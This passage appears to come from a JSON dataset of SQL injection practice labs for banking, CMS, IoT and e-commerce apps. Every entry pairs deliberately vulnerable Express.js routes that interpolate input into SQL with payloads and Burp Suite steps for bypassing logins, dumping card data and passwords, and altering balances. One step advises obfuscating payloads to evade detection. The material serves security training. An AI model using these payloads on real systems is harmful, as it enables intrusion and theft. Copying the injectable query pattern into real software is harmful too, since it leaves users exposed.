    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/admin/search', (req, res) => {\n  const { userId } = req.query;\n  const sql = `SELECT * FROM transactions WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Search failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT user_id, transaction_id, amount FROM transactions --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Transaction Status Check",
    "Lab Description": "The transaction status check API is vulnerable to SQL Injection. An attacker can exploit the lack of sanitization in the transaction ID parameter to exfiltrate transaction details from the database. The goal is to use SQL Injection to retrieve the status and details of multiple transactions by injecting malicious payloads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the status check request with Burp Suite and locate the vulnerable transaction ID parameter.",
      "Inject SQL payloads into the transaction ID parameter to extract sensitive data from the database.",
      "Use UNION SELECT to retrieve information from the transactions table.",
      "Verify the successful exfiltration of transaction details."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/transaction-status', (req, res) => {\n  const { transactionId } = req.query;\n  const sql = `SELECT * FROM transactions WHERE transaction_id = '${transactionId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transaction status retrieval failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT transaction_id, amount, status FROM transactions --",
      "'; SELECT * FROM transactions WHERE transaction_id = '1' --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Transaction Search",
    "Lab Description": "The transaction search feature is vulnerable to SQL Injection. The search field does not properly sanitize the transaction ID parameter. Attackers can use this vulnerability to extract transaction records from the database. The goal is to use SQL injection to retrieve all transactions made by any user, including sensitive details like account numbers and balances.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the search request and identify the vulnerable transaction ID parameter.",
      "Inject SQL payloads like ' OR 1=1 to test for vulnerability.",
      "Use UNION SELECT to fetch multiple columns, including sensitive transaction data.",
      "Verify the successful retrieval of multiple transaction records."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/transaction-search', (req, res) => {\n  const { transactionId } = req.query;\n  const sql = `SELECT * FROM transactions WHERE transaction_id = '${transactionId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Search failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT transaction_id, account_number, amount FROM transactions --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Account Balance Check",
    "Lab Description": "The account balance check feature in the banking portal is vulnerable to SQL Injection. The parameter used to retrieve the balance is not properly sanitized, allowing attackers to inject SQL payloads. The goal is to retrieve the balance of any user and modify it by injecting malicious SQL commands.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the balance check request with Burp Suite and identify the vulnerable account number field.",
      "Inject SQL payloads such as ' OR 1=1 to retrieve all user balances.",
      "Use UNION SELECT to query sensitive data such as account numbers and balances.",
      "Verify successful data exfiltration and balance modification."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/account-balance', (req, res) => {\n  const { accountNumber } = req.query;\n  const sql = `SELECT balance FROM accounts WHERE account_number = '${accountNumber}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Balance retrieval failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT account_number, balance FROM accounts --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Funds Transfer Page",
    "Lab Description": "The funds transfer page in the banking portal has a SQL Injection vulnerability. The page allows users to transfer funds, but the application directly inserts the amount and recipient account number into the SQL query. Attackers can inject SQL payloads to redirect funds to an attacker-controlled account. The goal is to manipulate the transaction to steal funds.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the transfer request with Burp Suite and identify the vulnerable account number and amount fields.",
      "Inject SQL payloads such as UNION SELECT to redirect funds to the attacker's account.",
      "Test using payloads like '; UPDATE accounts SET balance = balance - 1000 WHERE account_number = 'attacker_account' --",
      "Verify the success of the fund transfer and subsequent balance check."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/transfer', (req, res) => {\n  const { fromAccount, toAccount, amount } = req.body;\n  const sql = `INSERT INTO transactions (from_account, to_account, amount) VALUES ('${fromAccount}', '${toAccount}', '${amount}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transfer failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "'; UPDATE accounts SET balance = balance - 1000 WHERE account_number = 'attacker_account' --",
      "' UNION SELECT account_number, balance FROM accounts --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Admin View of User Accounts",
    "Lab Description": "The admin view that lists user accounts is vulnerable to SQL Injection. The admin can search for user accounts by name or ID, but this functionality is not properly sanitized. Attackers can inject SQL payloads into the search field to extract all user details, including account numbers, transaction history, and balances.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the search request with Burp Suite and identify the user ID or name parameter.",
      "Inject SQL payloads like ' UNION SELECT * FROM users -- to retrieve user data.",
      "Check for the exposure of sensitive information like account balances and transaction history.",
      "Verify the extraction of sensitive user account details."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/admin/users', (req, res) => {\n  const { userId } = req.query;\n  const sql = `SELECT * FROM users WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Search failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT user_id, username, balance FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Loan Approval API",
    "Lab Description": "The loan approval API in the banking portal is vulnerable to SQL Injection. The API accepts user inputs like loan amount and ID without proper input validation, allowing attackers to inject SQL payloads. The goal is to manipulate the approval process and grant loans to unauthorized accounts by injecting malicious SQL commands.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the loan approval request with Burp Suite and identify the loan amount and user ID parameters.",
      "Inject SQL payloads to manipulate the loan approval process and bypass authorization checks.",
      "Test payloads such as ' OR 1=1 -- to approve loans without proper validation.",
      "Verify the successful approval of loans and extraction of loan details."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/approve-loan', (req, res) => {\n  const { userId, amount } = req.body;\n  const sql = `INSERT INTO loans (user_id, amount) VALUES ('${userId}', '${amount}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Loan approval failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT user_id, amount FROM loans --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Fund Transfer History",
    "Lab Description": "The fund transfer history page is vulnerable to SQL Injection. The page retrieves the transfer records of a user based on the user ID parameter, which is not properly sanitized. Attackers can exploit this vulnerability to list all users' transfer records and even inject commands to alter the displayed data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transfer history page and identify the vulnerable user ID parameter.",
      "Inject SQL payloads such as ' OR 1=1 -- to test for vulnerability.",
      "Use UNION SELECT to fetch multiple columns from the transfer records table.",
      "Verify the successful extraction of multiple transfer records."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/transfer-history', (req, res) => {\n  const { userId } = req.query;\n  const sql = `SELECT * FROM transfers WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to retrieve transfers');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT user_id, amount, date FROM transfers --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Credit Card Info Retrieval",
    "Lab Description": "The credit card information retrieval feature is vulnerable to SQL Injection. The application retrieves credit card details based on the card number provided by the user. Attackers can inject SQL payloads into the card number field to retrieve all credit card information stored in the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the request with Burp Suite and identify the vulnerable card number field.",
      "Inject SQL payloads such as ' UNION SELECT * FROM credit_cards -- to test for vulnerability.",
      "Verify the successful retrieval of credit card information by using SQL injection.",
      "Clean up by obfuscating the payload to avoid detection."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/credit-card-info', (req, res) => {\n  const { cardNumber } = req.query;\n  const sql = `SELECT * FROM credit_cards WHERE card_number = '${cardNumber}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to retrieve card info');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT card_number, expiry_date, cvv FROM credit_cards --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in User Profile Update",
    "Lab Description": "The user profile update page is vulnerable to SQL Injection. Users can update their profile information, but the application fails to properly validate the input fields. Attackers can inject SQL payloads into these fields to manipulate their profile or even gain unauthorized access to other users' profiles.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the profile update request and identify the user ID and profile fields.",
      "Inject SQL payloads such as ' OR 1=1 -- to retrieve other user profiles.",
      "Use UNION SELECT to query the profiles table and access unauthorized user data.",
      "Verify the successful retrieval and update of profile data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/update-profile', (req, res) => {\n  const { userId, name, email } = req.body;\n  const sql = `UPDATE users SET name = '${name}', email = '${email}' WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Profile update failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT user_id, name, email FROM users --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Admin Panel",
    "Lab Description": "The admin panel for managing users is vulnerable to SQL Injection. Admins can search for users by ID or name, but the search functionality does not sanitize inputs. Attackers can use this to extract all user data, including account numbers, balances, and transaction histories.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the admin search request with Burp Suite and identify the vulnerable search field.",
      "Inject SQL payloads like ' UNION SELECT user_id, username, balance FROM users -- to extract user data.",
      "Test different payloads to verify the success of data extraction.",
      "Verify the successful enumeration of user accounts and sensitive data retrieval."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/admin/search-users', (req, res) => {\n  const { userId } = req.query;\n  const sql = `SELECT * FROM users WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Search failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT user_id, username, balance FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Loan Application Form",
    "Lab Description": "The loan application form is vulnerable to SQL Injection. The form collects user details such as loan amount and personal information, but the application fails to validate these inputs properly. Attackers can inject SQL payloads to manipulate the loan process, allowing them to apply for loans without proper validation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the loan application form submission with Burp Suite and identify the vulnerable loan amount and user details fields.",
      "Inject SQL payloads such as ' OR 1=1 -- to bypass authentication and loan application logic.",
      "Use UNION SELECT to inject fake loan records into the system.",
      "Verify the success of loan application by checking the database for injected records."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/apply-loan', (req, res) => {\n  const { userId, amount, duration } = req.body;\n  const sql = `INSERT INTO loans (user_id, amount, duration) VALUES ('${userId}', '${amount}', '${duration}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Loan application failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT user_id, amount FROM loans --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Transaction History",
    "Lab Description": "The transaction history page is vulnerable to SQL Injection. Users can filter their transaction history by date, but the date field is not properly sanitized. Attackers can inject SQL payloads to access other users' transaction data or manipulate the transaction records.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the request with Burp Suite and identify the vulnerable date field.",
      "Inject SQL payloads like ' OR 1=1 -- to bypass authentication and display all transaction records.",
      "Use UNION SELECT to extract multiple columns from the transactions table.",
      "Verify the successful extraction of transaction history data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/transaction-history', (req, res) => {\n  const { startDate, endDate } = req.query;\n  const sql = `SELECT * FROM transactions WHERE transaction_date BETWEEN '${startDate}' AND '${endDate}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to retrieve transactions');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT user_id, transaction_id, amount FROM transactions --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in User Login",
    "Lab Description": "The user login form is vulnerable to SQL Injection. The application fails to properly sanitize the username and password fields. Attackers can inject SQL payloads to bypass authentication and gain unauthorized access to users' accounts.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept the login request with Burp Suite and identify the vulnerable username and password fields.",
      "Inject SQL payloads like ' OR 1=1 -- to bypass authentication and login as any user.",
      "Verify the successful login by using the injected payload.",
      "Check for unauthorized access to user accounts."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Login failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' OR 'a'='a' --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Account Balance Check",
    "Lab Description": "The account balance check page is vulnerable to SQL Injection. Users can view their account balance by providing their account number. Attackers can inject SQL payloads to retrieve other users' account balances or modify their own balance.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request and identify the vulnerable account number parameter.",
      "Inject SQL payloads like ' OR 1=1 -- to retrieve all account balances.",
      "Use UNION SELECT to extract balance data for different users.",
      "Verify the successful retrieval and manipulation of account balance information."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/account-balance', (req, res) => {\n  const { accountNumber } = req.query;\n  const sql = `SELECT balance FROM accounts WHERE account_number = '${accountNumber}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to retrieve balance');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT account_number, balance FROM accounts --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Payment Processing",
    "Lab Description": "The payment processing page is vulnerable to SQL Injection. The application processes payments based on the amount and user ID parameters, but fails to sanitize the input. Attackers can inject SQL payloads to alter payment amounts or access unauthorized payment records.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the payment request with Burp Suite and identify the vulnerable user ID and payment amount fields.",
      "Inject SQL payloads like ' OR 1=1 -- to bypass authentication and modify payment records.",
      "Use UNION SELECT to query payment records and payment amounts.",
      "Verify the successful alteration of payment records and the payment amount."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/process-payment', (req, res) => {\n  const { userId, amount } = req.body;\n  const sql = `INSERT INTO payments (user_id, amount) VALUES ('${userId}', '${amount}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Payment failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT user_id, amount FROM payments --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Admin Panel User Management",
    "Lab Description": "The admin panel for managing user accounts is vulnerable to SQL Injection. Admins can search for users by their ID or username. Attackers can exploit this vulnerability to extract all user information, including usernames, account balances, and transaction histories.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the admin user search request with Burp Suite and identify the vulnerable user ID field.",
      "Inject SQL payloads like ' UNION SELECT username, balance FROM users -- to extract user data.",
      "Use UNION SELECT to query the users' table and extract sensitive user details.",
      "Verify the successful extraction of multiple user records and sensitive information."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/admin/user-management', (req, res) => {\n  const { userId } = req.query;\n  const sql = `SELECT * FROM users WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Search failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT username, balance FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - Advanced SQL Injection in Transfer Funds",
    "Lab Description": "The funds transfer feature of the banking portal allows users to transfer funds to other accounts using an account number. However, the application fails to sanitize input properly, allowing for SQL injection attacks. Attackers can bypass authentication, manipulate transfer amounts, and redirect funds to different accounts.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the funds transfer request using Burp Suite and identify the vulnerable account number and transfer amount fields.",
      "Inject SQL payloads like ' OR 1=1 -- to bypass authentication and execute the transfer function.",
      "Use UNION SELECT to extract account information from the users' table and manipulate the transfer amount.",
      "Verify successful fund transfer to a different account, and confirm manipulation of transfer details."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/transfer-funds', (req, res) => {\n  const { fromAccount, toAccount, amount } = req.body;\n  const sql = `UPDATE accounts SET balance = balance - ${amount} WHERE account_number = '${fromAccount}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transfer failed');\n    else {\n      const sql2 = `UPDATE accounts SET balance = balance + ${amount} WHERE account_number = '${toAccount}'`;\n      db.query(sql2, (err2, result2) => {\n        if (err2) res.status(500).send('Transfer failed');\n        else res.json({ success: true });\n      });\n    }\n  });\n});",
    "payloads": [
      "' UNION SELECT account_number, balance FROM accounts --",
      "' OR 1=1 --",
      "'; UPDATE accounts SET balance = 999999 WHERE account_number = '123456' --"
    ]
  },
  {
    "Lab scenario": "API Gateway - SQL Injection in API Authentication",
    "Lab Description": "The API gateway that handles user authentication is vulnerable to SQL Injection in the login endpoint. Attackers can inject malicious SQL payloads in the username or password fields to bypass authentication and obtain an authentication token, gaining unauthorized access to the API.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send login requests and identify the vulnerable username and password fields.",
      "Inject SQL payloads like ' OR 'a'='a' -- to bypass authentication and retrieve the authentication token.",
      "Use the obtained token to access protected API endpoints.",
      "Verify successful access to the API with the injected authentication token."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Login failed');\n    else res.json({ token: generateToken(result[0]) });\n  });\n});",
    "payloads": [
      "' OR 'a'='a' --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard - SQL Injection in Device Control Panel",
    "Lab Description": "The IoT device control panel is vulnerable to SQL Injection. Attackers can exploit this vulnerability by manipulating device IDs in the SQL query, allowing them to control devices that they do not own or view device data from other users.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the request using Burp Suite to inspect the device ID parameter.",
      "Inject SQL payloads like ' OR 1=1 -- to bypass authentication and control devices belonging to other users.",
      "Use UNION SELECT to extract device-specific data or modify device settings.",
      "Verify the successful exploitation by controlling unauthorized devices or extracting device data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/device-control', (req, res) => {\n  const { deviceId, action } = req.body;\n  const sql = `UPDATE devices SET status = '${action}' WHERE device_id = '${deviceId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Device control failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT device_id, status FROM devices --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "CMS - SQL Injection in Blog Post Retrieval",
    "Lab Description": "The CMS used by the blog site is vulnerable to SQL Injection in the post retrieval functionality. Attackers can inject SQL payloads into the post ID parameter, allowing them to retrieve any post content from the database, including unpublished or private posts.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the request with Burp Suite and identify the vulnerable post ID parameter.",
      "Inject SQL payloads like ' OR 1=1 -- to retrieve all blog posts from the database.",
      "Use UNION SELECT to extract private or unpublished posts.",
      "Verify successful retrieval of unauthorized content."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/post', (req, res) => {\n  const { postId } = req.query;\n  const sql = `SELECT * FROM posts WHERE post_id = '${postId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to retrieve post');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT post_id, title, content FROM posts --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "CMS - SQL Injection in Comment Section",
    "Lab Description": "The comment section of the CMS blog is vulnerable to SQL Injection. Attackers can inject SQL payloads to retrieve admin user credentials or other sensitive information stored in the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the comment submission request with Burp Suite and identify the vulnerable comment parameter.",
      "Inject SQL payloads like ' UNION SELECT username, password FROM users -- to extract admin credentials.",
      "Use UNION SELECT to query the users' table and retrieve admin information.",
      "Verify successful extraction of admin credentials and sensitive data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/comment', (req, res) => {\n  const { postId, comment } = req.body;\n  const sql = `INSERT INTO comments (post_id, comment_text) VALUES ('${postId}', '${comment}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to submit comment');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Account Balance Check",
    "Lab Description": "The banking portal allows users to check their account balance. However, due to improper input validation, attackers can inject SQL queries into the account number field to extract balance information from unauthorized accounts.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the request with Burp Suite and identify the account number parameter.",
      "Inject SQL payloads like ' OR 1=1 -- to retrieve the balance of all accounts.",
      "Use UNION SELECT to extract balance information and account details from the database.",
      "Verify successful exploitation by accessing account balance information from unauthorized accounts."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/account-balance', (req, res) => {\n  const { accountNumber } = req.query;\n  const sql = `SELECT balance FROM accounts WHERE account_number = '${accountNumber}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error retrieving balance');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT account_number, balance FROM accounts --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard - SQL Injection in Device Configuration",
    "Lab Description": "The IoT dashboard allows users to configure their devices. Due to improper input sanitization, an attacker can inject malicious SQL code into the device ID field, gaining control over other users' devices and retrieving sensitive data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture the request and identify the device ID parameter.",
      "Inject SQL payloads like ' OR 1=1 -- to control devices that belong to other users.",
      "Use UNION SELECT to extract device configurations, including sensitive information.",
      "Verify successful exploitation by accessing or altering device configurations belonging to other users."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/device-configuration', (req, res) => {\n  const { deviceId, config } = req.body;\n  const sql = `UPDATE devices SET config = '${config}' WHERE device_id = '${deviceId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to update configuration');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT device_id, config FROM devices --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "API Gateway - SQL Injection in User Registration",
    "Lab Description": "The user registration endpoint in the API gateway is vulnerable to SQL Injection. An attacker can inject SQL payloads into the username or password fields to bypass registration checks and add malicious accounts to the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to inspect the registration request and identify the vulnerable fields (username, password).",
      "Inject SQL payloads like ' OR 1=1 -- to bypass validation and add new users to the database.",
      "Use UNION SELECT to retrieve existing usernames and email addresses from the database.",
      "Verify successful registration of a new user or retrieval of existing users' data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/register', (req, res) => {\n  const { username, password, email } = req.body;\n  const sql = `INSERT INTO users (username, password, email) VALUES ('${username}', '${password}', '${email}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Registration failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password, email FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "CMS - SQL Injection in Search Functionality",
    "Lab Description": "The CMS search feature is vulnerable to SQL Injection. An attacker can inject malicious SQL code into the search query, allowing them to bypass filters and retrieve sensitive information from the database, such as user credentials or unpublished content.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture the search query and identify the vulnerable search parameter.",
      "Inject SQL payloads like ' UNION SELECT username, password FROM users -- to retrieve sensitive user information.",
      "Use UNION SELECT to access sensitive data such as unpublished posts or private content.",
      "Verify successful retrieval of unauthorized data from the database."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const { query } = req.query;\n  const sql = `SELECT * FROM posts WHERE content LIKE '%${query}%'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Search failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "E-Commerce Site - SQL Injection in Product Filters",
    "Lab Description": "The e-commerce site's product filter functionality is vulnerable to SQL Injection. Attackers can inject SQL payloads into the filter parameters, allowing them to retrieve product details, manipulate prices, or bypass product visibility checks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the filter request using Burp Suite and identify the vulnerable filter parameters.",
      "Inject SQL payloads like ' UNION SELECT product_id, price, name FROM products -- to retrieve product information.",
      "Use UNION SELECT to manipulate product visibility or alter prices.",
      "Verify successful manipulation of product details and price display."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/products', (req, res) => {\n  const { filter } = req.query;\n  const sql = `SELECT * FROM products WHERE category = '${filter}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to retrieve products');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT product_id, price, name FROM products --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Funds Transfer",
    "Lab Description": "The funds transfer functionality in the banking portal is vulnerable to SQL Injection. An attacker can inject malicious SQL queries into the account number and amount fields, bypassing validation and transferring funds to unauthorized accounts.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture the funds transfer request and identify the vulnerable parameters (account number, amount).",
      "Inject SQL payloads like ' OR 1=1 -- to bypass validation and initiate unauthorized fund transfers.",
      "Use UNION SELECT to extract data such as account balances or to manipulate the transfer amount.",
      "Verify successful transfer of funds to an unauthorized account."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/transfer-funds', (req, res) => {\n  const { fromAccount, toAccount, amount } = req.body;\n  const sql = `UPDATE accounts SET balance = balance - ${amount} WHERE account_number = '${fromAccount}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error transferring funds');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT account_number, balance FROM accounts --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "CMS - SQL Injection in User Management",
    "Lab Description": "The CMS has a user management system that allows administrators to add and remove users. Due to improper input sanitization, attackers can inject SQL queries into the user ID or role fields, modifying user privileges or deleting unauthorized accounts.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the request with Burp Suite and identify the vulnerable user ID and role parameters.",
      "Inject SQL payloads like ' OR 1=1 -- to bypass user validation and escalate privileges.",
      "Use UNION SELECT to retrieve a list of users and their roles, or delete user accounts.",
      "Verify successful modification of user roles or unauthorized deletion of accounts."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/manage-users', (req, res) => {\n  const { userId, role } = req.body;\n  const sql = `UPDATE users SET role = '${role}' WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to update user');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT user_id, role FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "API Gateway - SQL Injection in Product Review",
    "Lab Description": "The product review API in an e-commerce platform is vulnerable to SQL Injection. Attackers can inject malicious SQL queries into the review text or rating fields, allowing them to alter product ratings or view other users' reviews.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to inspect the product review API request and identify vulnerable fields (review text, rating).",
      "Inject SQL payloads like ' UNION SELECT product_id, rating FROM reviews -- to retrieve product ratings and reviews.",
      "Use UNION SELECT to alter product ratings or inject fake reviews into the system.",
      "Verify successful manipulation of product reviews or ratings."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/product-review', (req, res) => {\n  const { productId, reviewText, rating } = req.body;\n  const sql = `INSERT INTO reviews (product_id, review_text, rating) VALUES ('${productId}', '${reviewText}', '${rating}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to post review');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT product_id, review_text FROM reviews --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard - SQL Injection in Device Firmware Upload",
